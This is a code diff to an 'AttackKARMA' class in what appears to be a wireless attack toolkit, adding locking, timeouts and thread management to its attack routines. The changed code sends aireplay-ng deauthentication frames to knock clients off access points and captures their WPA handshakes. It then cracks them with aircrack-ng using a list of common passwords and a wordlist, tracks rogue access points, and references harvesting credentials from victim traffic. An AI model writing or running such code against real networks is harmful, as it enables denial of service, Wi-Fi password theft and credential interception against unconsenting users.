@@ -52,6 +52,42 @@ class AttackKARMA(Attack):
         self.deauth_active = False     # Deauth attack status
         self.handshake_capture_active = False
         
+        # Enhanced handshake capture management
+        self.active_capture_threads = {}  # Track active capture threads
+        self.handshake_capture_queue = []  # Queue for handshake capture
+        self.rogue_ap_networks = []  # Track rogue AP networks
+        
+        # Thread safety mechanisms
+        self._lock = threading.Lock()  # Main lock for shared data
+        self._capture_lock = threading.Lock()  # Lock for capture operations
+        self._client_lock = threading.Lock()  # Lock for client management
+        self._process_lock = threading.Lock()  # Lock for process management
+        
+        # Resource limits and monitoring
+        self.MAX_CONCURRENT_CAPTURES = 2
+        self.MAX_HANDSHAKES_PER_CLIENT = 3
+        self.MAX_MEMORY_USAGE = 100 * 1024 * 1024  # 100MB
+        self._capture_attempts = {}  # Track capture attempts per client
+        
+        # Timeout mechanisms to prevent infinite loops
+        self.MAX_MONITORING_ITERATIONS = 1000  # Max iterations for monitoring loops
+        self.MAX_DEAUTH_ITERATIONS = 500  # Max iterations for deauth loops
+        self.MAX_CONNECTION_MONITOR_ITERATIONS = 2000  # Max iterations for connection monitoring
+        self.LOOP_TIMEOUT_SECONDS = 300  # 5 minutes max per loop
+        self._loop_start_times = {}  # Track loop start times
+        
+        # Process management and cleanup
+        self._process_registry = {}  # Track all spawned processes
+        self._process_timeouts = {}  # Track process timeouts
+        self.PROCESS_CLEANUP_TIMEOUT = 10  # Seconds to wait for process cleanup
+        self._cleanup_handlers_registered = False
+        
+        # Interface conflict resolution
+        self._interface_locks = {}  # Track interface usage locks
+        self._interface_operations = {}  # Track ongoing interface operations
+        self.INTERFACE_OPERATION_TIMEOUT = 30  # Max time for interface operations
+        self._interface_conflict_detected = False
+        
         # Multi-interface support
         self.available_interfaces = []  # List of available wireless interfaces
         self.probe_interface = None     # Interface for probe capture
@@ -1870,89 +1906,574 @@ class AttackKARMA(Attack):
             Color.pl('{!} {R}Error starting handshake capture: {O}%s{W}' % str(e))
             return False
     
-    def monitor_handshakes(self):
-        """Monitor for WPA handshakes from connected clients"""
+    def check_loop_timeout(self, loop_name, max_iterations=None, max_seconds=None):
+        """Check if a loop has exceeded its timeout limits"""
         try:
-            while self.handshake_capture_active and self.running:
-                # Check for new connections and capture handshakes
-                if self.connected_clients:
-                    for client_mac in self.connected_clients:
-                        if client_mac not in self.captured_handshakes:
-                            self.capture_handshake_for_client(client_mac)
+            current_time = time.time()
+            
+            # Initialize loop start time if not exists
+            if loop_name not in self._loop_start_times:
+                self._loop_start_times[loop_name] = current_time
+            
+            # Check time-based timeout
+            if max_seconds is None:
+                max_seconds = self.LOOP_TIMEOUT_SECONDS
+            
+            elapsed_time = current_time - self._loop_start_times[loop_name]
+            if elapsed_time > max_seconds:
+                Color.pl('{!} {R}Loop timeout exceeded for {O}%s{W}: {C}%.1f{W} seconds' % (loop_name, elapsed_time))
+                return True
+            
+            # Check iteration-based timeout
+            if max_iterations is None:
+                max_iterations = self.MAX_MONITORING_ITERATIONS
+            
+            # This would need to be called with iteration count from the calling loop
+            return False
+            
+        except Exception as e:
+            if Configuration.verbose > 1:
+                Color.pl('{!} {R}Error checking loop timeout: {O}%s{W}' % str(e))
+            return True
+    
+    def reset_loop_timer(self, loop_name):
+        """Reset the timer for a specific loop"""
+        try:
+            self._loop_start_times[loop_name] = time.time()
+        except Exception:
+            pass
+    
+    def register_process(self, process_name, process_obj, timeout_seconds=None):
+        """Register a process for tracking and cleanup"""
+        try:
+            with self._process_lock:
+                self._process_registry[process_name] = {
+                    'process': process_obj,
+                    'start_time': time.time(),
+                    'timeout': timeout_seconds or self.PROCESS_CLEANUP_TIMEOUT
+                }
+                Color.pl('{+} {C}Registered process: {G}%s{W}' % process_name)
+        except Exception as e:
+            if Configuration.verbose > 1:
+                Color.pl('{!} {R}Error registering process: {O}%s{W}' % str(e))
+    
+    def unregister_process(self, process_name):
+        """Unregister a process from tracking"""
+        try:
+            with self._process_lock:
+                if process_name in self._process_registry:
+                    del self._process_registry[process_name]
+                    Color.pl('{+} {C}Unregistered process: {G}%s{W}' % process_name)
+        except Exception as e:
+            if Configuration.verbose > 1:
+                Color.pl('{!} {R}Error unregistering process: {O}%s{W}' % str(e))
+    
+    def cleanup_all_processes(self):
+        """Clean up all registered processes"""
+        try:
+            Color.pl('{+} {C}Starting comprehensive process cleanup...{W}')
+            
+            with self._process_lock:
+                processes_to_cleanup = list(self._process_registry.items())
+                self._process_registry.clear()
+            
+            # Clean up processes outside of lock to avoid deadlock
+            for process_name, process_info in processes_to_cleanup:
+                try:
+                    process_obj = process_info['process']
+                    timeout = process_info['timeout']
+                    
+                    if hasattr(process_obj, 'poll') and process_obj.poll() is None:
+                        # Process is still running
+                        Color.pl('{+} {C}Terminating process: {G}%s{W}' % process_name)
+                        
+                        # Try graceful termination first
+                        if hasattr(process_obj, 'terminate'):
+                            process_obj.terminate()
+                        
+                        # Wait for process to terminate
+                        try:
+                            process_obj.wait(timeout=timeout)
+                            Color.pl('{+} {G}Process terminated gracefully: {C}%s{W}' % process_name)
+                        except subprocess.TimeoutExpired:
+                            # Force kill if graceful termination fails
+                            Color.pl('{!} {R}Process did not terminate gracefully, force killing: {O}%s{W}' % process_name)
+                            if hasattr(process_obj, 'kill'):
+                                process_obj.kill()
+                            process_obj.wait(timeout=2)
+                    else:
+                        Color.pl('{+} {G}Process already terminated: {C}%s{W}' % process_name)
+                        
+                except Exception as e:
+                    if Configuration.verbose > 1:
+                        Color.pl('{!} {R}Error cleaning up process {O}%s{W}: {R}%s{W}' % (process_name, str(e)))
+            
+            Color.pl('{+} {G}Process cleanup completed{W}')
+            
+        except Exception as e:
+            if Configuration.verbose > 1:
+                Color.pl('{!} {R}Error in process cleanup: {O}%s{W}' % str(e))
+    
+    def monitor_process_health(self):
+        """Monitor health of registered processes"""
+        try:
+            with self._process_lock:
+                current_time = time.time()
+                unhealthy_processes = []
                 
-                time.sleep(3)
+                for process_name, process_info in self._process_registry.items():
+                    process_obj = process_info['process']
+                    start_time = process_info['start_time']
+                    timeout = process_info['timeout']
+                    
+                    # Check if process is still running
+                    if hasattr(process_obj, 'poll'):
+                        if process_obj.poll() is not None:
+                            # Process has terminated
+                            unhealthy_processes.append(process_name)
+                        elif current_time - start_time > timeout * 10:  # 10x timeout threshold
+                            # Process has been running too long
+                            unhealthy_processes.append(process_name)
+                
+                # Clean up unhealthy processes
+                for process_name in unhealthy_processes:
+                    Color.pl('{!} {R}Unhealthy process detected: {O}%s{W}' % process_name)
+                    del self._process_registry[process_name]
+                    
+        except Exception as e:
+            if Configuration.verbose > 1:
+                Color.pl('{!} {R}Error monitoring process health: {O}%s{W}' % str(e))
+    
+    def acquire_interface_lock(self, interface, operation_name):
+        """Acquire a lock for interface operations to prevent conflicts"""
+        try:
+            if interface not in self._interface_locks:
+                self._interface_locks[interface] = threading.Lock()
+            
+            # Try to acquire lock with timeout
+            acquired = self._interface_locks[interface].acquire(timeout=5)
+            if acquired:
+                self._interface_operations[interface] = {
+                    'operation': operation_name,
+                    'start_time': time.time(),
+                    'thread_id': threading.get_ident()
+                }
+                Color.pl('{+} {C}Acquired interface lock for {G}%s{W}: {C}%s{W}' % (interface, operation_name))
+                return True
+            else:
+                Color.pl('{!} {R}Failed to acquire interface lock for {O}%s{W}: {O}%s{W}' % (interface, operation_name))
+                return False
+                
+        except Exception as e:
+            if Configuration.verbose > 1:
+                Color.pl('{!} {R}Error acquiring interface lock: {O}%s{W}' % str(e))
+            return False
+    
+    def release_interface_lock(self, interface):
+        """Release interface lock and clean up operation tracking"""
+        try:
+            if interface in self._interface_locks:
+                if interface in self._interface_operations:
+                    operation_info = self._interface_operations[interface]
+                    elapsed_time = time.time() - operation_info['start_time']
+                    Color.pl('{+} {C}Released interface lock for {G}%s{W}: {C}%s{W} ({G}%.1f{W}s)' % 
+                            (interface, operation_info['operation'], elapsed_time))
+                    del self._interface_operations[interface]
+                
+                self._interface_locks[interface].release()
+                
+        except Exception as e:
+            if Configuration.verbose > 1:
+                Color.pl('{!} {R}Error releasing interface lock: {O}%s{W}' % str(e))
+    
+    def check_interface_conflicts(self):
+        """Check for interface conflicts and resolve them"""
+        try:
+            current_time = time.time()
+            conflicted_interfaces = []
+            
+            for interface, operation_info in self._interface_operations.items():
+                elapsed_time = current_time - operation_info['start_time']
+                if elapsed_time > self.INTERFACE_OPERATION_TIMEOUT:
+                    conflicted_interfaces.append(interface)
+                    Color.pl('{!} {R}Interface operation timeout detected: {O}%s{W} ({C}%s{W})' % 
+                            (interface, operation_info['operation']))
+            
+            # Resolve conflicts
+            for interface in conflicted_interfaces:
+                Color.pl('{!} {R}Resolving interface conflict: {O}%s{W}' % interface)
+                self.release_interface_lock(interface)
+                self._interface_conflict_detected = True
+            
+            return len(conflicted_interfaces) == 0
+            
+        except Exception as e:
+            if Configuration.verbose > 1:
+                Color.pl('{!} {R}Error checking interface conflicts: {O}%s{W}' % str(e))
+            return False
+    
+    def safe_interface_operation(self, interface, operation_name, operation_func, *args, **kwargs):
+        """Safely execute interface operations with conflict resolution"""
+        try:
+            # Acquire interface lock
+            if not self.acquire_interface_lock(interface, operation_name):
+                return False
+            
+            try:
+                # Execute the operation
+                result = operation_func(*args, **kwargs)
+                return result
+            finally:
+                # Always release the lock
+                self.release_interface_lock(interface)
+                
+        except Exception as e:
+            if Configuration.verbose > 1:
+                Color.pl('{!} {R}Error in safe interface operation: {O}%s{W}' % str(e))
+            # Ensure lock is released even on error
+            try:
+                self.release_interface_lock(interface)
+            except:
+                pass
+            return False
+    
+    def monitor_handshakes(self):
+        """Monitor for WPA handshakes from connected clients - Thread-safe with timeout protection"""
+        try:
+            Color.pl('{+} {C}Starting thread-safe handshake monitoring with timeout protection...{W}')
+            
+            # Initialize timeout tracking
+            self.reset_loop_timer('handshake_monitoring')
+            
+            # Initialize thread-safe data structures
+            with self._lock:
+                self.active_capture_threads = {}
+                self.handshake_capture_queue = []
+                self._capture_attempts = {}
+            
+            iteration_count = 0
+            max_iterations = self.MAX_MONITORING_ITERATIONS
+            
+            while (self.handshake_capture_active and 
+                   self.running and 
+                   iteration_count < max_iterations and
+                   not self.check_loop_timeout('handshake_monitoring', max_iterations, 300)):
+                
+                try:
+                    iteration_count += 1
+                    
+                    # Log progress every 100 iterations
+                    if iteration_count % 100 == 0:
+                        Color.pl('{+} {C}Handshake monitoring iteration {G}%d{W}/{C}%d{W}' % (iteration_count, max_iterations))
+                    
+                    # Thread-safe client processing
+                    with self._client_lock:
+                        clients_to_process = []
+                        if self.connected_clients:
+                            for client_mac in list(self.connected_clients):
+                                # Check if client needs handshake capture
+                                if (client_mac not in self.captured_handshakes and 
+                                    client_mac not in self.active_capture_threads and
+                                    client_mac not in self.handshake_capture_queue):
+                                    
+                                    # Check capture attempt limits
+                                    attempts = self._capture_attempts.get(client_mac, 0)
+                                    if attempts < self.MAX_HANDSHAKES_PER_CLIENT:
+                                        clients_to_process.append(client_mac)
+                    
+                    # Add clients to queue thread-safely
+                    with self._capture_lock:
+                        for client_mac in clients_to_process:
+                            if client_mac not in self.handshake_capture_queue:
+                                self.handshake_capture_queue.append(client_mac)
+                                self._capture_attempts[client_mac] = self._capture_attempts.get(client_mac, 0) + 1
+                    
+                    # Process capture queue with limits
+                    with self._capture_lock:
+                        active_count = len(self.active_capture_threads)
+                        queue_size = len(self.handshake_capture_queue)
+                        
+                        # Process queue respecting limits
+                        while (active_count < self.MAX_CONCURRENT_CAPTURES and 
+                               queue_size > 0 and 
+                               self.handshake_capture_active and 
+                               self.running):
+                            
+                            client_mac = self.handshake_capture_queue.pop(0)
+                            queue_size -= 1
+                            
+                            # Start capture in separate thread
+                            self.start_async_handshake_capture(client_mac)
+                    
+                    # Clean up completed capture threads
+                    self.cleanup_completed_capture_threads()
+                    
+                    # Adaptive sleep based on activity
+                    if queue_size > 0 or active_count > 0:
+                        time.sleep(0.5)  # More frequent checks when active
+                    else:
+                        time.sleep(2)  # Less frequent when idle
+                    
+                except Exception as e:
+                    if Configuration.verbose > 1:
+                        Color.pl('{!} {R}Error in handshake monitoring loop: {O}%s{W}' % str(e))
+                    time.sleep(2)
+            
+            # Check why loop ended
+            if iteration_count >= max_iterations:
+                Color.pl('{!} {R}Handshake monitoring stopped: maximum iterations reached ({C}%d{W})' % max_iterations)
+            elif self.check_loop_timeout('handshake_monitoring'):
+                Color.pl('{!} {R}Handshake monitoring stopped: timeout exceeded')
+            else:
+                Color.pl('{+} {G}Handshake monitoring stopped normally{W}')
                 
         except Exception as e:
             if Configuration.verbose > 1:
                 Color.pl('{!} {R}Error monitoring handshakes: {O}%s{W}' % str(e))
+        finally:
+            # Cleanup all active capture threads
+            self.cleanup_all_capture_threads()
+            Color.pl('{+} {G}Handshake monitoring stopped safely{W}')
     
-    def capture_handshake_for_client(self, client_mac):
-        """Capture WPA handshake for a specific client"""
+    def start_async_handshake_capture(self, client_mac):
+        """Start asynchronous handshake capture for a client - Thread-safe implementation"""
         try:
-            Color.pl('{+} {C}Attempting to capture handshake from {G}%s{W}...' % client_mac)
-            
-            # Use airodump to capture handshake
-            handshake_file = Configuration.temp('karma_handshake_%s' % client_mac.replace(':', ''))
-            
-            with Airodump(interface=self.probe_interface,
-                         target_bssid=client_mac,
-                         output_file_prefix='karma_handshake_%s' % client_mac.replace(':', ''),
-                         delete_existing_files=True) as airodump:
+            # Thread-safe thread creation and tracking
+            with self._capture_lock:
+                # Double-check if client is already being processed
+                if client_mac in self.active_capture_threads:
+                    return
                 
-                # Monitor for handshake for 30 seconds
-                timer = Timer(30)
-                handshake_found = False
+                # Create capture thread
+                capture_thread = threading.Thread(
+                    target=self.async_capture_handshake_for_client,
+                    args=(client_mac,),
+                    name=f'handshake_capture_{client_mac.replace(":", "")}'
+                )
+                capture_thread.daemon = True
                 
-                while not timer.ended() and not handshake_found and self.running:
-                    # Check if handshake was captured
-                    cap_files = airodump.find_files(endswith='.cap')
-                    if cap_files:
-                        # Use aircrack-ng to validate handshake
-                        if self.validate_handshake(cap_files[0]):
-                            self.captured_handshakes[client_mac] = cap_files[0]
-                            Color.pl('{+} {G}WPA handshake captured from {C}%s{W}!' % client_mac)
-                            handshake_found = True
-                            
-                            # Attempt to crack the handshake
-                            self.crack_handshake(client_mac, cap_files[0])
+                # Track the thread
+                self.active_capture_threads[client_mac] = {
+                    'thread': capture_thread,
+                    'start_time': time.time(),
+                    'status': 'starting'
+                }
+                
+                capture_thread.start()
+                Color.pl('{+} {C}Started thread-safe handshake capture for {G}%s{W}' % client_mac)
+            
+        except Exception as e:
+            if Configuration.verbose > 1:
+                Color.pl('{!} {R}Error starting async handshake capture: {O}%s{W}' % str(e))
+            # Remove from active threads if failed to start
+            with self._capture_lock:
+                if client_mac in self.active_capture_threads:
+                    del self.active_capture_threads[client_mac]
+    
+    def async_capture_handshake_for_client(self, client_mac):
+        """Asynchronous handshake capture for a specific client - Fixed implementation"""
+        try:
+            # Update thread status
+            if client_mac in self.active_capture_threads:
+                self.active_capture_threads[client_mac]['status'] = 'capturing'
+            
+            Color.pl('{+} {C}Starting handshake capture for {G}%s{W}...' % client_mac)
+            
+            # Get the AP BSSID for this client (CRITICAL FIX)
+            ap_bssid = self.get_ap_bssid_for_client(client_mac)
+            if not ap_bssid:
+                Color.pl('{!} {R}No AP found for client {O}%s{W}' % client_mac)
+                return
+            
+            Color.pl('{+} {C}Targeting AP {G}%s{W} for client {G}%s{W}' % (ap_bssid, client_mac))
+            
+            # Send deauth to trigger handshake (CRITICAL FIX)
+            self.trigger_handshake_with_deauth(ap_bssid, client_mac)
+            
+            # Use safe interface operation for airodump
+            def capture_operation():
+                with Airodump(interface=self.probe_interface,
+                             target_bssid=ap_bssid,  # FIXED: Use AP BSSID, not client MAC
+                             output_file_prefix='karma_handshake_%s' % client_mac.replace(':', ''),
+                             delete_existing_files=True) as airodump:
                     
-                    time.sleep(2)
-                
-                if not handshake_found:
-                    Color.pl('{!} {R}No handshake captured from {O}%s{W}' % client_mac)
+                    # Monitor for handshake with extended timeout
+                    timer = Timer(60)  # Increased timeout for better success rate
+                    handshake_found = False
+                    last_check_time = time.time()
+                    
+                    while not timer.ended() and not handshake_found and self.running:
+                        # Check if handshake was captured
+                        cap_files = airodump.find_files(endswith='.cap')
+                        if cap_files:
+                            # Use async validation to prevent blocking
+                            if self.validate_handshake_async(cap_files[0]):
+                                self.captured_handshakes[client_mac] = cap_files[0]
+                                Color.pl('{+} {G}WPA handshake captured from {C}%s{W}!' % client_mac)
+                                handshake_found = True
+                                
+                                # Attempt to crack the handshake asynchronously
+                                self.crack_handshake_async(client_mac, cap_files[0])
+                        
+                        # Adaptive sleep based on activity
+                        current_time = time.time()
+                        if current_time - last_check_time > 5:  # No activity for 5 seconds
+                            time.sleep(0.5)  # Check more frequently
+                        else:
+                            time.sleep(1)  # Normal check interval
+                        
+                        last_check_time = current_time
+                    
+                    if not handshake_found:
+                        Color.pl('{!} {R}No handshake captured from {O}%s{W} after 60 seconds' % client_mac)
+                    
+                    return handshake_found
+            
+            # Execute capture operation safely
+            handshake_found = self.safe_interface_operation(
+                self.probe_interface, 
+                f'handshake_capture_{client_mac}', 
+                capture_operation
+            )
                     
         except Exception as e:
             if Configuration.verbose > 1:
-                Color.pl('{!} {R}Error capturing handshake: {O}%s{W}' % str(e))
+                Color.pl('{!} {R}Error in async handshake capture: {O}%s{W}' % str(e))
+        finally:
+            # Update thread status to completed
+            if client_mac in self.active_capture_threads:
+                self.active_capture_threads[client_mac]['status'] = 'completed'
     
-    def validate_handshake(self, capfile):
-        """Validate if a captured file contains a valid WPA handshake"""
+    def capture_handshake_for_client(self, client_mac):
+        """Legacy method - redirects to async implementation"""
+        self.start_async_handshake_capture(client_mac)
+    
+    def validate_handshake_async(self, capfile):
+        """Validate handshake asynchronously to prevent blocking - Fixed implementation"""
         try:
-            # Use aircrack-ng to check for handshake
+            # Use timeout to prevent blocking
             cmd = ['aircrack-ng', capfile]
-            result = subprocess.run(cmd, capture_output=True, text=True)
+            result = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
             
-            # Check if aircrack found a handshake
-            if 'WPA' in result.stdout and 'handshake' in result.stdout.lower():
-                return True
+            # More robust handshake detection
+            output = result.stdout.lower()
+            return ('wpa' in output and 'handshake' in output) or '1 handshake' in output
+            
+        except subprocess.TimeoutExpired:
+            if Configuration.verbose > 1:
+                Color.pl('{!} {O}Handshake validation timeout for {C}%s{W}' % capfile)
             return False
-            
-        except Exception:
+        except Exception as e:
+            if Configuration.verbose > 1:
+                Color.pl('{!} {R}Error validating handshake: {O}%s{W}' % str(e))
             return False
     
-    def crack_handshake(self, client_mac, handshake_file):
-        """Attempt to crack captured WPA handshake"""
+    def get_ap_bssid_for_client(self, client_mac):
+        """Get the AP BSSID for a specific client - CRITICAL FIX"""
         try:
-            Color.pl('{+} {C}Attempting to crack handshake from {G}%s{W}...' % client_mac)
+            # Check if client is connected to our rogue AP
+            if hasattr(self, 'rogue_ap_networks') and self.rogue_ap_networks:
+                for network in self.rogue_ap_networks:
+                    if client_mac in network.get('clients', []):
+                        return network.get('bssid')
+            
+            # Check real networks for this client
+            if hasattr(self, 'real_networks') and self.real_networks:
+                for network in self.real_networks:
+                    if hasattr(network, 'clients'):
+                        for client in network.clients:
+                            if client.bssid == client_mac:
+                                return network.bssid
+            
+            # Fallback: use target BSSID if available
+            if hasattr(self, 'target') and self.target:
+                return self.target.bssid
+            
+            # Last resort: scan for APs with this client
+            return self.scan_for_ap_with_client(client_mac)
+            
+        except Exception as e:
+            if Configuration.verbose > 1:
+                Color.pl('{!} {R}Error getting AP BSSID for client: {O}%s{W}' % str(e))
+            return None
+    
+    def scan_for_ap_with_client(self, client_mac):
+        """Scan for APs that have the specified client"""
+        try:
+            # Quick scan to find APs with this client
+            cmd = ['airodump-ng', self.probe_interface, '--bssid', client_mac, '--write', '/tmp/scan_temp', '--output-format', 'csv']
+            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
+            
+            # Parse output to find AP BSSID
+            lines = result.stdout.split('\n')
+            for line in lines:
+                if client_mac in line and ',' in line:
+                    parts = line.split(',')
+                    if len(parts) > 1:
+                        return parts[0].strip()
+            
+            return None
+            
+        except Exception as e:
+            if Configuration.verbose > 1:
+                Color.pl('{!} {R}Error scanning for AP with client: {O}%s{W}' % str(e))
+            return None
+    
+    def trigger_handshake_with_deauth(self, ap_bssid, client_mac):
+        """Send deauth frames to trigger handshake - CRITICAL FIX"""
+        try:
+            Color.pl('{+} {C}Sending deauth to trigger handshake: AP {G}%s{W} -> Client {G}%s{W}' % (ap_bssid, client_mac))
+            
+            # Send deauth from AP to client
+            deauth_cmd = ['aireplay-ng', '-0', '3', '-a', ap_bssid, '-c', client_mac, self.probe_interface]
+            subprocess.run(deauth_cmd, capture_output=True, timeout=5)
+            
+            # Small delay to let deauth take effect
+            time.sleep(1)
+            
+            # Send deauth from client to AP (reverse direction)
+            deauth_cmd_reverse = ['aireplay-ng', '-0', '2', '-a', ap_bssid, '-c', client_mac, self.probe_interface]
+            subprocess.run(deauth_cmd_reverse, capture_output=True, timeout=5)
+            
+            Color.pl('{+} {G}Deauth frames sent successfully{W}')
+            
+        except Exception as e:
+            if Configuration.verbose > 1:
+                Color.pl('{!} {R}Error sending deauth frames: {O}%s{W}' % str(e))
+    
+    def crack_handshake_async(self, client_mac, handshake_file):
+        """Attempt to crack captured WPA handshake asynchronously"""
+        try:
+            # Start cracking in background thread
+            crack_thread = threading.Thread(
+                target=self._crack_handshake_worker,
+                args=(client_mac, handshake_file),
+                name=f'crack_handshake_{client_mac.replace(":", "")}'
+            )
+            crack_thread.daemon = True
+            crack_thread.start()
+            
+        except Exception as e:
+            if Configuration.verbose > 1:
+                Color.pl('{!} {R}Error starting async handshake cracking: {O}%s{W}' % str(e))
+    
+    def _crack_handshake_worker(self, client_mac, handshake_file):
+        """Worker thread for handshake cracking"""
+        try:
+            Color.pl('{+} {C}Starting background cracking for {G}%s{W}...' % client_mac)
             
             # Try common passwords first
             common_passwords = [
                 '12345678', 'password', 'admin', '1234567890',
-                'qwerty123', 'password123', '123456789', 'admin123'
+                'qwerty123', 'password123', '123456789', 'admin123',
+                'welcome', '12345', '123456', 'password1'
             ]
             
             for password in common_passwords:
-                if self.try_password(handshake_file, password):
+                if not self.running:  # Check if attack is still running
+                    break
+                    
+                if self.try_password_async(handshake_file, password):
                     self.cracked_passwords[client_mac] = password
                     Color.pl('{+} {G}PASSWORD CRACKED for {C}%s{W}: {R}%s{W}' % (client_mac, password))
                     
@@ -1962,9 +2483,9 @@ class AttackKARMA(Attack):
             
             # Try wordlist if available
             wordlist_file = getattr(Configuration, 'wordlist', None)
-            if wordlist_file and os.path.exists(wordlist_file):
-                Color.pl('{+} {C}Trying wordlist attack...{W}')
-                if self.try_wordlist_attack(handshake_file, wordlist_file):
+            if wordlist_file and os.path.exists(wordlist_file) and self.running:
+                Color.pl('{+} {C}Trying wordlist attack for {G}%s{W}...' % client_mac)
+                if self.try_wordlist_attack_async(handshake_file, wordlist_file):
                     Color.pl('{+} {G}Password found in wordlist for {C}%s{W}' % client_mac)
                     return True
             
@@ -1973,44 +2494,132 @@ class AttackKARMA(Attack):
             
         except Exception as e:
             if Configuration.verbose > 1:
-                Color.pl('{!} {R}Error cracking handshake: {O}%s{W}' % str(e))
+                Color.pl('{!} {R}Error in handshake cracking worker: {O}%s{W}' % str(e))
             return False
     
-    def try_password(self, handshake_file, password):
-        """Try a specific password against handshake"""
+    def try_password_async(self, handshake_file, password):
+        """Try a specific password against handshake asynchronously"""
         try:
             cmd = ['aircrack-ng', '-w', '-', handshake_file]
-            result = subprocess.run(cmd, input=password, capture_output=True, text=True)
+            result = subprocess.run(cmd, input=password, capture_output=True, text=True, timeout=10)
             
             return 'KEY FOUND!' in result.stdout
             
+        except subprocess.TimeoutExpired:
+            return False
         except Exception:
             return False
     
-    def try_wordlist_attack(self, handshake_file, wordlist_file):
-        """Try wordlist attack against handshake"""
+    def try_wordlist_attack_async(self, handshake_file, wordlist_file):
+        """Try wordlist attack against handshake asynchronously"""
         try:
             cmd = ['aircrack-ng', '-w', wordlist_file, handshake_file]
-            result = subprocess.run(cmd, capture_output=True, text=True)
+            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
             
             if 'KEY FOUND!' in result.stdout:
                 # Extract password from output
                 lines = result.stdout.split('\n')
                 for line in lines:
                     if 'KEY FOUND!' in line:
-                        # Extract password from line
                         parts = line.split()
                         if len(parts) > 2:
                             password = parts[-1]
                             return password
             return False
             
+        except subprocess.TimeoutExpired:
+            return False
         except Exception:
             return False
     
+    def cleanup_completed_capture_threads(self):
+        """Clean up completed capture threads - Thread-safe implementation"""
+        try:
+            with self._capture_lock:
+                completed_clients = []
+                for client_mac, thread_info in self.active_capture_threads.items():
+                    if thread_info['status'] == 'completed' or not thread_info['thread'].is_alive():
+                        completed_clients.append(client_mac)
+                
+                for client_mac in completed_clients:
+                    del self.active_capture_threads[client_mac]
+                    
+        except Exception as e:
+            if Configuration.verbose > 1:
+                Color.pl('{!} {R}Error cleaning up capture threads: {O}%s{W}' % str(e))
+    
+    def cleanup_all_capture_threads(self):
+        """Clean up all active capture threads - Thread-safe implementation"""
+        try:
+            with self._capture_lock:
+                threads_to_cleanup = list(self.active_capture_threads.items())
+                self.active_capture_threads.clear()
+            
+            # Clean up threads outside of lock to avoid deadlock
+            for client_mac, thread_info in threads_to_cleanup:
+                try:
+                    if thread_info['thread'].is_alive():
+                        # Thread is still running, wait briefly for completion
+                        thread_info['thread'].join(timeout=2)
+                except Exception:
+                    pass
+                    
+        except Exception as e:
+            if Configuration.verbose > 1:
+                Color.pl('{!} {R}Error cleaning up all capture threads: {O}%s{W}' % str(e))
+    
+    def crack_handshake(self, client_mac, handshake_file):
+        """Legacy method - redirects to async implementation"""
+        self.crack_handshake_async(client_mac, handshake_file)
+    
+    def try_password(self, handshake_file, password):
+        """Legacy method - redirects to async implementation"""
+        return self.try_password_async(handshake_file, password)
+    
+    def try_wordlist_attack(self, handshake_file, wordlist_file):
+        """Legacy method - redirects to async implementation"""
+        return self.try_wordlist_attack_async(handshake_file, wordlist_file)
+    
+    def add_rogue_ap_network(self, bssid, essid, clients=None):
+        """Add a rogue AP network to tracking"""
+        try:
+            network_info = {
+                'bssid': bssid,
+                'essid': essid,
+                'clients': clients or [],
+                'created_time': time.time()
+            }
+            
+            # Check if network already exists
+            for i, existing_network in enumerate(self.rogue_ap_networks):
+                if existing_network['bssid'] == bssid:
+                    # Update existing network
+                    self.rogue_ap_networks[i] = network_info
+                    return
+            
+            # Add new network
+            self.rogue_ap_networks.append(network_info)
+            Color.pl('{+} {C}Added rogue AP network: {G}%s{W} ({C}%s{W})' % (essid, bssid))
+            
+        except Exception as e:
+            if Configuration.verbose > 1:
+                Color.pl('{!} {R}Error adding rogue AP network: {O}%s{W}' % str(e))
+    
+    def update_rogue_ap_clients(self, bssid, clients):
+        """Update clients for a rogue AP network"""
+        try:
+            for network in self.rogue_ap_networks:
+                if network['bssid'] == bssid:
+                    network['clients'] = clients
+                    return True
+            return False
+            
+        except Exception as e:
+            if Configuration.verbose > 1:
+                Color.pl('{!} {R}Error updating rogue AP clients: {O}%s{W}' % str(e))
+            return False
     
     def monitor_credential_harvesting(self):
-        """Monitor and harvest credentials from victim traffic"""
         try:
             while self.running:
                 if self.connected_clients:
@@ -3465,6 +4074,12 @@ server=8.8.8.8
         self.running = False
         self.deauth_active = False
         self.handshake_capture_active = False
+        
+        # Clean up handshake capture threads
+        self.cleanup_all_capture_threads()
+        
+        # Clean up all registered processes
+        self.cleanup_all_processes()
         
         # Switch back to probe mode if using single interface
         if self.probe_interface == self.rogue_interface:
